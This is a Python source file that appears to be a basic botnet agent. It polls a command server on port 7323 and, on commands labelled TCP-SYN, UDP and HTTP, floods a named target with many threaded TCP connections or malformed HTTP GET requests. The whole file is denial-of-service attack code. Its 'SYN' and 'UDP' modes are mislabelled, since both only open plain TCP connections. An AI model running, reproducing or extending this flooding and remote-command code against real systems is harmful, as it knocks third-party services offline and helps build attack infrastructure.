import socket
import time
import random
import threading

class Poison (threading.Thread):
    def __init__(self, threadID, url, port, type_name):
        threading.Thread.__init__(self)
        self.url = url
        self.port = port
        self.threadID = threadID
        self.type_name = type_name
    def run(self):
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        url = self.url
        port = self.port

        print(f'Connecting to {url}:{port}')

        if(self.type_name == "http_attack"):
            http_get_attack(sock, url, port)
        else:
            sock.connect((url, port))
        time.sleep(1)
        sock.close()

def http_get_attack(sock, url, port):
    headers = [
        "User-Agent: Mozilla/5.0 (X11; Linux x86_64)",
        "Content-Length: {}".format(random.randint(1024, 2048))
    ]
    message = "GET / HTTP/1.1\n"

    data = message + "\n".join(headers) + "\n\n"

    try:
        sock.connect((url, port))
        for header in headers:
            sock.send(data.encode("utf-8"))

    except Exception as e:
        print("Error:", e)


def attack(url, port, n, type_name):
    threads = []
    print("Creating theads...")
    for i in range(n):
        threads.append(Poison(i, url, port, type_name))

    print("Starting threads...")
    for thread in threads:
        thread.start()

    print("Waiting for threads...")
    for thread in threads:
        thread.join()

def handle_command(command):
    try:
        if command.startswith("SEND TCP-SYN"):
            args = command.split()
            url = args[2]
            port = int(args[3])
            n = int(args[4])
            print(url, port)
            attack(url, port, n, "tcp_attack")
        if command.startswith("SEND UDP"):
            args = command.split()
            url = args[2]
            port = int(args[3])
            n = int(args[4])
            print(url, port)
            attack(url, port, n, "udp_attack")
        if command.startswith("SEND HTTP"):
            args = command.split()
            url = args[2]
            port = int(args[3])
            n = int(args[4])
            print(url, port)
            attack(url, port, n, "http_attack")
    except Exception as e:
        print("Error decoding command")
        print(e)


while True:
    master = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    master.connect(("localhost", 7323))

    res = master.recv(64)

    command = res.decode("utf-8")

    handle_command(command)

    master.close()
    time.sleep(20)

